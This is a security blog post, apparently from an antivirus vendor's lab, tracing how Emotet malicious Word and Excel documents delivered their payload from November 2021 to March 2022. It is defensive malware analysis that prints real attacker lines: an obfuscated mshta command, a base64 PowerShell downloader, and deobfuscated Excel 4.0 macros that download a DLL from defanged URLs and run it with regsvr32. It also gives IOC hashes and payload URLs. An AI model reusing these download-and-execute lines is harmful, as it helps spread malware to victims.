<div>
<img alt="" class="hidden-social-img" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Emotet-Boutade.png" style="max-width:80%;height:auto;width:auto;"/>
<a class="uncategorized" href="https://labs.k7computing.com/index.php/category/macro/">Macro</a><a class="uncategorized" href="https://labs.k7computing.com/index.php/category/malicious-links/">Malicious Links</a><a class="uncategorized" href="https://labs.k7computing.com/index.php/category/obfuscation-techniques/">Obfuscation Techniques</a><a class="uncategorized" href="https://labs.k7computing.com/index.php/category/spam/">Spam</a>
<h1 class="entry-title">Diving into the Emotet Maldoc Boutade</h1>
By Gaurav YadavApril 28, 2022
 
<p></p><p>Emotet is a malware that is spread mainly via e-mail spam campaigns. A typical spam email contains an infected/weaponized document. This document acts as the initial vector that downloads/drops the actual malware and compromises the user’s machine. In this blog, we will be explaining how Emotet uses Maldocs, password-protected obfuscated macros and the changes done to the same to download the actual payload along with the timeline of the activity starting from November 2021, when it was back after a hiatus, till the time of writing this blog.</p>
<h2>November 2021</h2>
<p>Emotet started sending malicious documents through emails which had password protected VBA macros and the template is as shown in Figure 1.</p>
<figure class="wp-caption aligncenter" id="attachment_23856"><img alt="" class="wp-image-23856 size-full" height="466" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure1-1.png" style="max-width:800px;height:auto;width:auto;" width="776"/><figcaption class="wp-caption-text" id="caption-attachment-23856">Figure 1: Word templates used by maldocs in Nov 2021</figcaption></figure>
<p>VBA Macros contained in the “.docm” file, first invokes cmd.exe to run powershell.exe with the following command</p>
<figure class="wp-caption aligncenter" id="attachment_23862"><img alt="" class="wp-image-23862 size-full" height="258" src="https://labs.k7computing.com/wp-content/uploads/2022/04/snippet1.jpg" style="max-width:800px;height:auto;width:auto;" width="1105"/><figcaption class="wp-caption-text" id="caption-attachment-23862">Snippet 1: PowerShell command to download and execute the Emotet DLL</figcaption></figure>
<p>This command will access all the websites stored in the variable $strs and if the Emotet DLL is found, it will download the payload DLL into C:\ProgramData\ as ‘&lt;random-name&gt;.dll’. After downloading, the DLL will be executed with the help of C:\Windows\SysWow64\rundll32.exe.</p>
<figure class="wp-caption aligncenter" id="attachment_23858"><img alt="" class="wp-image-23858 size-full" height="63" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure2.jpg" style="max-width:800px;height:auto;width:auto;" width="978"/><figcaption class="wp-caption-text" id="caption-attachment-23858">Figure 2: Execution flow of maldoc</figcaption></figure>
<p>Following lure was used in Excel files to trick users into enabling the macros in it. We can notice that Excel is also mispronounced. However, VBA macros were the same for both Excel and Word files.</p>
<figure class="wp-caption aligncenter" id="attachment_23860"><img alt="" class="wp-image-23860 size-full" height="436" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure3-1.png" style="max-width:800px;height:auto;width:auto;" width="1279"/><figcaption class="wp-caption-text" id="caption-attachment-23860">Figure 3: Excel sheet lure</figcaption></figure>
<p> </p>
<h2>December 2021</h2>
<p>Most of the Emotet related maldocs were seen to be dropping a .bat file. Instead of using readable commands, threat actors had obfuscated the commands within the batch script. The .bat file is then executed via CMD .</p>
<figure class="wp-caption aligncenter" id="attachment_23863"><img alt="" class="wp-image-23863 size-full" height="140" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure4.jpg" style="max-width:800px;height:auto;width:auto;" width="785"/><figcaption class="wp-caption-text" id="caption-attachment-23863">Figure 4: .bat file being dropped in C:\ProgramData</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_23864"><img alt="" class="wp-image-23864 size-full" height="389" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure5.jpg" style="max-width:800px;height:auto;width:auto;" width="1124"/><figcaption class="wp-caption-text" id="caption-attachment-23864">Figure 5: Obfuscated batch commands in the dropped .bat file</figcaption></figure>
<p>When the .bat file is executed, it creates a PowerShell process with a base64 encoded PowerShell command. But the final PowerShell command remains similar as seen above in Snippet 1.</p>
<p>powershell -enc JABzAHQAcgBzAD0AIgBoAHQAdABwADoALwAvAGcAYQBtAGEA</p>
<p>ZQBzAC4AcwBoAG8AcAAvAHcAcAAtAGMAbwBuAHQAZQBuAHQALwBwAGwAdQBnAGkAbgBzAC8AcwBTAFQAVABvAGEARQB3AEMARwA1AFYAQQBTAHcALwAsAGgAdAB0AHAAOgAvAC8AbgBlAHcAcwBhAGEAcgBjAHQAZQBjAGgALgBjAG8AbQAvAHcAcAAtAGMAbwBuA……</p>
<p>Snippet 2: Base64 encoded PowerShell command</p>
<figure class="wp-caption aligncenter" id="attachment_23865"><img alt="" class="wp-image-23865 size-full" height="177" src="https://labs.k7computing.com/wp-content/uploads/2022/04/snippet3.jpg" style="max-width:800px;height:auto;width:auto;" width="945"/><figcaption class="wp-caption-text" id="caption-attachment-23865">Snippet 3: Decoded PowerShell command</figcaption></figure>
<h2>December 2021 – January 2022</h2>
<p>During late December and January 2022, Emotet related maldocs were seen to execute html files present on the malicious site as shown in Snippet 4 with the help of mshta.exe as it can execute the JavaScript present in the html file.</p>
<p>Following command was executed during execution of word or excel files </p>
<p>cmd /c m^sh^t^a h^tt^p^:/^/87[.]251[.]86[.]1/pp/pp.html</p>
<p>Snippet 4: Cmd command executed through macros</p>
<p>The JavaScript present contacts the html file, resulting in the execution of the following obfuscated PowerShell command shown in Snippet 5. </p>
<figure class="wp-caption aligncenter" id="attachment_23867"><img alt="" class="wp-image-23867 size-full" height="303" src="https://labs.k7computing.com/wp-content/uploads/2022/04/snippet5.jpg" style="max-width:800px;height:auto;width:auto;" width="865"/><figcaption class="wp-caption-text" id="caption-attachment-23867">Snippet 5: PowerShell command obfuscated by the string “Google”</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_23868"><img alt="" class="wp-image-23868 size-full" height="57" src="https://labs.k7computing.com/wp-content/uploads/2022/04/snippet6.jpg" style="max-width:800px;height:auto;width:auto;" width="839"/><figcaption class="wp-caption-text" id="caption-attachment-23868">Snippet 6: Deobfuscated Snippet 5 PowerShell command</figcaption></figure>
<p>If we notice Snippet 6 closely, the PowerShell command tries to contact a URL ”hxxp:// 87[.]251[.]86[.]178/pp /PP.PNG” to get the content from a .png file which is suspicious. The downloaded .png file is not what it is supposed to be, but is a PowerShell script as shown in Figure 6.</p>
<figure class="wp-caption aligncenter" id="attachment_23869"><img alt="" class="wp-image-23869 size-full" height="513" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure6.jpg" style="max-width:800px;height:auto;width:auto;" width="1166"/><figcaption class="wp-caption-text" id="caption-attachment-23869">Figure 6: Content of PP.png</figcaption></figure>
<p>This command is similar to the original command that Emotet directly stores in VBA macros. However, an extra step of complexity is now employed by the threat actor to evade detection.</p>
<h2>February 2022</h2>
<p>It was noticed that instead of dropping just the .bat file, an obfuscated VBScript was dropped and was executed by wscript.exe as we can see in Figure 7. </p>
<figure class="wp-caption aligncenter" id="attachment_23870"><img alt="" class="wp-image-23870 size-full" height="245" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure7.jpg" style="max-width:800px;height:auto;width:auto;" width="827"/><figcaption class="wp-caption-text" id="caption-attachment-23870">Figure 7: Procmon logs showing Excel file dropping .vbs and .bat files</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_23871"><img alt="" class="wp-image-23871 size-full" height="121" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure8.jpg" width="628"/><figcaption class="wp-caption-text" id="caption-attachment-23871">Figure 8: Deobfuscated VBScript</figcaption></figure>
<p>From Figure 8, we can glean that the dropped VBScript is responsible for executing both the .bat file that was dropped and the Emotet DLL file that was downloaded. The .bat file contains an obfuscated PowerShell command which is also base64 encoded. After base64 decoding, we got the following command:</p>
<figure class="wp-caption aligncenter" id="attachment_23872"><img alt="" class="wp-image-23872 size-full" height="318" src="https://labs.k7computing.com/wp-content/uploads/2022/04/snippet7.jpg" style="max-width:800px;height:auto;width:auto;" width="1137"/><figcaption class="wp-caption-text" id="caption-attachment-23872">Snippet 7: Base64 decoded PowerShell command</figcaption></figure>
<p>The PowerShell command shown in Snippet 7, is used to access all websites stored in the variable “gjsebngukiwug3kwjd” which downloads the Emotet DLL and places it in C:\ProgramData so that the earlier dropped VBScript as shown in Figure 8, is able to execute the DLL with the help of rundll32.exe.</p>
<h2>February – March 2022</h2>
<p>During late February and March, Emotet related maldocs were seen using just Excel Macros 4.0 instead of VBA macros, since excel allows to run functions from cells which enabled the threat actors to obfuscate Emotet macros using different hidden sheets and widespread cells.</p>
<figure class="wp-caption aligncenter" id="attachment_23873"><img alt="" class="wp-image-23873 size-full" height="476" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure9.jpg" style="max-width:800px;height:auto;width:auto;" width="1188"/><figcaption class="wp-caption-text" id="caption-attachment-23873">Figure 9: Hidden macro sheets</figcaption></figure>
<figure class="wp-caption aligncenter" id="attachment_23874"><img alt="" class="wp-image-23874 size-full" height="691" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure10.jpg" style="max-width:800px;height:auto;width:auto;" width="1172"/><figcaption class="wp-caption-text" id="caption-attachment-23874">Figure 10: Obfuscated macros present in the hidden sheets</figcaption></figure>
<p>After deobfuscation the macros looked like what is shown below:</p>
<p>=CALL(“urlmon”,”URLDownloadToFileA”,”JJCCBB”,0,” https://dev[.]subs2me[.]com/wp-includes/EMa/”,”..\dw1.ocx”,0,0)</p>
<p>=EXEC(“C:\Windows\SysWow64\regsvr32.exe -s ..\dw1.ocx”)</p>
<p>=RETURN()</p>
<p>Snippet 8: Deobfuscated Excel macros</p>
<p>As we can see from the macro in Snippet 8, the Excel file first calls a function named URLDownloadToFileA which is present in the dll urlmon.dll with the required parameters url: hxxps://dev[.]subs2me[.]com/wp-includes/EMa/ and file name: dw1.ocx.</p>
<figure class="wp-caption aligncenter" id="attachment_23875"><img alt="" class="wp-image-23875 size-full" height="261" src="https://labs.k7computing.com/wp-content/uploads/2022/04/Figure11.jpg" style="max-width:800px;height:auto;width:auto;" width="728"/><figcaption class="wp-caption-text" id="caption-attachment-23875">Figure 11: Procmon log showing excel file contacting payload sites mentioned in the macros</figcaption></figure>
<p>After getting the .ocx file which is the Emotet dll it is then executed with the help of regsvr32.exe.</p>
<p>If you notice throughout the campaigns, what the threat actors wanted to achieve remained the same viz. to download the Emotet DLL and to execute it. However, the techniques they are using to get this done has been changing consistently so as to evade behaviour based detections. Users should exercise caution whenever they try to open Excel/Word files from unknown sources. Also, use a reputable security product like “K7 Total Security” which provides protection from such malware. Also keep your security product updated to stay safe from the latest threats.</p>
<h2>Indicators of Compromise (IOCs)</h2>
<p> </p>
<table>
<tbody>
<tr>
<td>Hash</td>
<td>Detection Name</td>
</tr>
<tr>
<td>8625BAE7CF49EAA789A4E837B124E864 </td>
<td>Trojan ( 0058ce181 )</td>
</tr>
<tr>
<td>2B8055CA8B0F93226B13F15CA83ADF41</td>
<td>Trojan ( 0001140e1 )</td>
</tr>
<tr>
<td>6983B7390889217D8F57CF218835DCE4 </td>
<td> Trojan ( 0058cef41 )</td>
</tr>
<tr>
<td> B6E9028801480B692E04A6297F4E3CFC </td>
<td>Trojan ( 0001140e1 )</td>
</tr>
<tr>
<td>00BD27A66D752E35A41CB7CE82524C3C </td>
<td> Trojan ( 0058ce181 )</td>
</tr>
</tbody>
</table>
<p> </p>
<h3>URLs</h3>
<p>https://evgeniys[.]ru/sap-logs/D6/</p>
<p>http://crownadvertising[.]ca/wp-includes/OxiAACCoic/</p>
<p>https://cars-taxonomy[.]mywebartist[.]eu/-/BPCahsAFjwF/</p>
<p>http://immoinvest[.]com[.]br/blog_old/wp-admin/luoT/</p>
<p>https://yoho[.]love/wp-content/e4laFBDXIvYT6O/</p>
<p>https://www.168801[.]xyz/wp-content/6J3CV4meLxvZP/</p>
<p>https://www[.]pasionportufuturo[.]pe/wp-content/XUBS/</p>
<p>http://gamaes[.]shop/wp-content/plugins/sSTToaEwCG5VASw/</p>
<p>http://newsaarctech[.]com/wp-content/Sx9tvV5/</p>
<p>http://www[.]fizik[.]tv[.]tr/ex/mlFHNKb9x/</p>
<p>https://shopallcars[.]com/node_modules/dXF0W/</p>
<p>https://infohybrid[.]com/assets/Lq5vllPN/</p>
<p>http://fse[.]in[.]ua/layouts/WMIxdId0bHiS/GnfihOVGqjmsWPJg4/</p>
<p>http://actividades[.]laforetlanguages[.]com/wpadmin/BlkdOKDXL/,</p>
<p>http://sbcopylive[.]com[.]br/rjuz/w/</p>
<p>https://trasix[.]com/wpadmin/y5Aa1jt0Sp2Qk/</p>
<p>https://www.parkinsons[.]co.in/abc/Y6Y0fTbUEg6/</p>
<p>https://biz[.]merlin[.]ua/wpadmin/W6agtFSRZGt371dV/</p>
<p>http://bruckevn[.]site/3yztzzvh/nmY4wZfbYL/</p>
<p>https://pardiskood[.]com/wp-content/NR/</p>
<p>https://daujimaharajmandir[.]org/wp-includes/63De/</p>
<p>https://datasits[.]com/wp-includes/Zkj4QO/</p>
<p>https://anugerahmasinternasional[.]co[.]id/wp-admin/SJbxE5I/</p>
<p>https://atmedic[.]cl/sistemas/3ZbsUAU/</p>
<p>https://anwaralbasateen[.]com/Fox-C404/mDHkfgebMRzmGKBy/</p>
<p>https://dev[.]subs2me[.]com/wp-includes/EMa/</p>
<p>http:// 87[.]251[.]86[.]178/pp /PP.PNG</p>
<h3>References</h3>
<p>https://github.com/executemalware/Malware-IOCs/</p>
<p>https://github.com/jstrosch/malware-samples</p>
<p></p>
<h3 class="comment-reply-title">Like what you're reading? Subscribe to our top stories.</h3>
<p>If you want to subscribe to our monthly newsletter, please submit the form below.</p> Email* : 
<ul class="controls">
<li class="previous-post mouse-leaving">
<h3>Previous Post« <a href="https://labs.k7computing.com/index.php/vajraspy-an-android-rat/" rel="prev">VajraSpy – An Android RAT</a>
</h3>
</li>
<li class="next-post mouse-leaving">
<h3>Next Post
</h3>
</li>
</ul>
<h3 class="related-title">More Posts</h3>
</div>